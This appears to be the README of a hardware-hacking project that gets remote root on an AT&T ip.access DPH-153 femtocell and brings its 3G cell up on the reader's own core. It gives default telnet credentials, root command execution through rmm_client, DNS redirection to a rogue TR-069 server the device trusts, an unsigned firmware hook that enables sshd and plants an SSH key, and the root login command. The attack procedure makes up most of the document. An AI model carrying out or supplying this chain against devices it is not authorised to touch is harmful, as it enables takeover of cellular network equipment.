# DPH153-AT

Remote root on an AT&T ip.access DPH-153 (Cisco nano3G) femtocell over CWMP, then
bringing its 3G cell up on your own core.

## Addressing (fixed on the DPH-153)

- Ralink router SoC: `192.168.157.185` (telnet)
- PICO / NodeB (the femto itself): `192.168.157.186`

Your workstation reaches `.186` through the Ralink. Add a route to the unit's internal
subnet on the interface facing it:

    ip route add 192.168.157.184/30 dev <iface>

## 1. Access the Ralink, set DNS

Telnet in as `guest` / `1qaz@WSX`. Run commands as root via:

    rmm_client 192.168.157.185 cs_cmd "<command>"

Point the femto's resolver (dnrd) at your ACS host:

    rmm_client 192.168.157.185 cs_cmd "killall dnrd; dnrd -s <ACS_HOST> -a 192.168.157.185 -u guest"

dnrd reverts on every PICO power-cycle; re-run after a reboot. Helpers: `rroot.py '<cmd>'`
(injects passwordless root, returns output), `rl.py '<cmd>'`.

## 2. Fire up the ACS and CWMP / XMPP server

`acs_tr069.py` is one TLS server on `:443` serving both, selected by the destination IP the
femto dialed (it sends no SNI), plus an HTTP server on `:8080` for the firmware:

- `<ACS_HOST>` alias `.203` -> ACS (CWMP / TR-069)
- `<ACS_HOST>` alias `.202` -> CMHS (XMPP provisioning)

Run it (OpenSSL legacy is required for the old ciphers):

    OPENSSL_CONF=legacy.cnf python3 acs_tr069.py

DNS (served via the Ralink dnrd above) must resolve `femtocell.wireless.att.com` -> `.203`
and `cmhsse-decatur.wireless.att.com` -> `.202`. The femto accepts the server's self-signed
cert (stock-firmware weakness); no CA work needed.

Arm the exploit download: create `.selfclean_arm`, remove `.selfclean_sent` (send-once gate).
On the next Inform the ACS sends a `Download` for `rmm-selfclean.sdp`; the femto fetches it
from `:8080` and applies it.

## 3. Custom firmware

`rmm-selfclean.sdp` is a hook-only ip.access `.SDP` (signing is off on this build). The CWMP
`Download` runs `selfclean_hook.sh` as root: it tears down the upgrade transaction (no reboot
loop), enables the stock sshd on `0.0.0.0:22` via nv_env, and installs `cwmp_rce_key.pub`.
The filename must start with `rmm-` or the femto rejects it (fault 9003).

## 4. Log in as root

    ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa \
        -o PubkeyAcceptedKeyTypes=+ssh-rsa -o Ciphers=+aes128-cbc \
        -i cwmp_rce_key root@192.168.157.186

No sftp on the unit; pull files with `ssh ... 'cat /path'`.

## 5. Logs

- Firmware/hook: `/var/ipaccess/selfclean_hook.log`, `/var/ipaccess/cwmp_rce_proof_persist`
- Femto manager: `/var/ipaccess/mgr_app.log`, `/var/log/messages`
- ACS / CMHS: stdout of `acs_tr069.py`

## Files

- `cwmp_rce_key`, `cwmp_rce_key.pub` - SSH keypair baked into the firmware
- `rmm-selfclean.sdp` - the RCE firmware image
- `selfclean_hook.sh` - the root hook it runs
- `acs_tr069.py` - ACS + CMHS (XMPP) server
- `rroot.py`, `rl.py` - Ralink root helpers
